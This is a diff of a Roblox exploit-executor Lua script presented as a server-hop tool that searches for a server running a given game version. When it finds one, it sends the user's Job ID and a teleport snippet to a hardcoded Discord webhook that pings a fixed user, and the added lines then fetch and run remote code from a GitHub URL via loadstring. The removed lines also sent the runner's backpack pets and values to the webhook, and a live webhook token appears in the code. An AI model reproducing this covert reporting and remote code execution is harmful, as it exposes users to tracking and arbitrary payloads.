@@ -1,13 +1,21 @@
 local desiredVersion = "1689"
 local PlaceId = game.PlaceId
+
+-- SERVICES
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
+-- Clipboard compatibility
 local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set)
 
-repeat task.wait(0.1) until game:IsLoaded()
+-- Wait until game is fully loaded before continuing
+repeat
+    task.wait(0.1)
+until game:IsLoaded()
+
+-- Wait extra 5 seconds before continuing
 task.wait(5)
 
 -- UI SETUP
@@ -47,30 +55,49 @@ local function createLoadingUI()
     versionLabel.TextStrokeTransparency = 0.5
     versionLabel.Parent = bg
 
+    local creditsLabel = Instance.new("TextLabel")
+    creditsLabel.Name = "CreditsLabel"
+    creditsLabel.Size = UDim2.new(1, 0, 0, 40)
+    creditsLabel.Position = UDim2.new(0, 0, 0.9, 0)
+    creditsLabel.BackgroundTransparency = 1
+    creditsLabel.Text = "Credits: mimicccccc1#2347"
+    creditsLabel.Font = Enum.Font.SourceSansItalic
+    creditsLabel.TextSize = 24
+    creditsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    creditsLabel.TextStrokeTransparency = 0.7
+    creditsLabel.Parent = bg
+
     return gui, statusLabel, versionLabel
 end
 
 local gui, statusLabel, versionLabel = createLoadingUI()
 
--- FUNCTION: Get actual version string
+-- FUNCTION: Get actual version string from game UI
 local function getActualVersion()
     for _, obj in ipairs(game:GetDescendants()) do
         if obj:IsA("TextLabel") then
             local text = obj.Text
             local version = string.match(text, "^v(%d+)$")
-            if version then return version end
+            if version then
+                return version
+            end
         end
     end
     return nil
 end
 
--- FUNCTION: Check version
+-- FUNCTION: Check if actual version matches desired
 local function hasCorrectVersion()
     local actualVersion = getActualVersion()
-    versionLabel.Text = actualVersion and "Current version: v"..actualVersion or "Current version: unknown"
+    if actualVersion then
+        versionLabel.Text = "Current version: v" .. actualVersion
+    else
+        versionLabel.Text = "Current version: unknown"
+    end
     return actualVersion == desiredVersion
 end
 
+-- FUNCTION: Copy Job ID to clipboard
 local function copyJobId()
     if setclipboard then
         setclipboard(game.JobId)
@@ -80,36 +107,24 @@ local function copyJobId()
     end
 end
 
--- SEND WEBHOOK
+-- FUNCTION: Send webhook with job info and teleport code
 local function sendWebhook()
     local webhookUrl = "https://discord.com/api/webhooks/1403212302605357088/iqWgOYegTK5wOyc_yspDLA2HglemNCckSpLcsun76id0AtotHuotJBET4wHwl1R_vb-M"
     local discordId = "910015978639872050"
-
-    -- Build pet info
-    local petInfo = ""
-    for _, item in ipairs(Player.Backpack:GetChildren()) do
-        if item:IsA("Tool") and item:FindFirstChild("PetWeight") and item:FindFirstChild("PetAge") then
-            local name = item.Name
-            local weight = item.PetWeight.Value
-            local age = item.PetAge.Value
-            local value = item:FindFirstChild("SellValue") and item.SellValue.Value or 0
-            petInfo = petInfo .. string.format("🐧 - %s [%.2f KG] [Age %d] → %s₵\n", name, weight, age, string.format("%0.0f", value))
-        end
-    end
-
-    if petInfo == "" then
-        petInfo = "No pets found."
-    end
-
-    local embed = {
-        title = "Server Version",
-        description = string.format("<@%s>\n**Place Version**: %s\n**Total Player In Server**: (%d/5)\n\n**Job ID**: `%s`\n\n**Teleport Code:**\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```\n\n🐾 **Backpack Pets:**\n```%s```",
-            discordId, desiredVersion, #Players:GetPlayers(), game.JobId, PlaceId, game.JobId, petInfo),
-        color = 0x00FF00,
-        footer = {text = "Server Hop Script"}
+    local message = string.format(
+        "**Server Version**\nPlace Version: %s\n\n**Total Player In Server**\n(%d/%d)\n\n**Job ID:**\n%s\n\n**Teleport Code:**\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)```",
+        desiredVersion,
+        #Players:GetPlayers(),
+        Players.MaxPlayers or 5,
+        game.JobId,
+        PlaceId,
+        game.JobId
+    )
+    local data = {
+        content = "<@" .. discordId .. "> " .. message
     }
+    local body = HttpService:JSONEncode(data)
 
-    local body = HttpService:JSONEncode({embeds = {embed}})
     local success, response = pcall(function()
         return HttpService:RequestAsync({
             Url = webhookUrl,
@@ -120,39 +135,47 @@ local function sendWebhook()
     end)
 
     if success and (response.StatusCode == 204 or response.Success) then
-        print("[Webhook] Sent successfully.")
+        print("[Webhook] Message sent successfully.")
     else
-        warn("[Webhook] Failed: "..(response and response.StatusMessage or "Unknown error"))
+        warn("[Webhook] Failed to send message:", response and response.StatusMessage or "Unknown error")
     end
 end
 
--- HOP SERVERS
+-- FUNCTION: Server hop to a random public server with cursor pagination (improved)
 local function tryServerHop()
-    local servers, cursor = {}, nil
+    local servers = {}
+    local cursor = nil
+
     repeat
         local url = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
-        if cursor then url = url .. "&cursor=" .. cursor end
-        local success, response = pcall(function() return HttpService:JSONDecode(game:HttpGet(url)) end)
+        if cursor then
+            url = url .. "&cursor=" .. cursor
+        end
+
+        local success, response = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(url))
+        end)
+
         if success and response and response.data then
-            for _, server in ipairs(response.data) do
+            for _, server in pairs(response.data) do
                 if server.playing < server.maxPlayers and server.id ~= game.JobId then
                     table.insert(servers, server.id)
                 end
             end
             cursor = response.nextPageCursor
         else
-            warn("-- Failed to get servers.")
+            warn("-- Failed to get server list.")
             return false
         end
-    until not cursor or #servers >= 50
+    until not cursor or #servers >= 50 -- stops early once 50 servers collected for performance
 
     if #servers > 0 then
-        local serverId = servers[math.random(1, #servers)]
+        local randomServerId = servers[math.random(1, #servers)]
         statusLabel.Text = "🔁 Hopping to new server..."
-        TeleportService:TeleportToPlaceInstance(PlaceId, serverId, Player)
+        TeleportService:TeleportToPlaceInstance(PlaceId, randomServerId, Player)
         return true
     else
-        warn("-- No servers found.")
+        warn("-- No servers found to hop.")
         return false
     end
 end
@@ -164,14 +187,27 @@ task.spawn(function()
             statusLabel.Text = "✅ Correct version found: " .. desiredVersion
             print("[✓] Correct version found.")
             copyJobId()
+
+            -- Send webhook
             sendWebhook()
-            if gui then gui:Destroy() end
+
+            -- Destroy UI
+            if gui then
+                gui:Destroy()
+            end
+
+            -- Load external script
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+
             break
         else
             statusLabel.Text = "❌ Version not found. Searching..."
             local hopped = tryServerHop()
-            if hopped then break end
-            task.wait(3)
+            if hopped then
+                break -- stop loop once teleport starts
+            else
+                task.wait(3) -- wait before retrying if teleport failed
+            end
         end
         task.wait(1)
     end
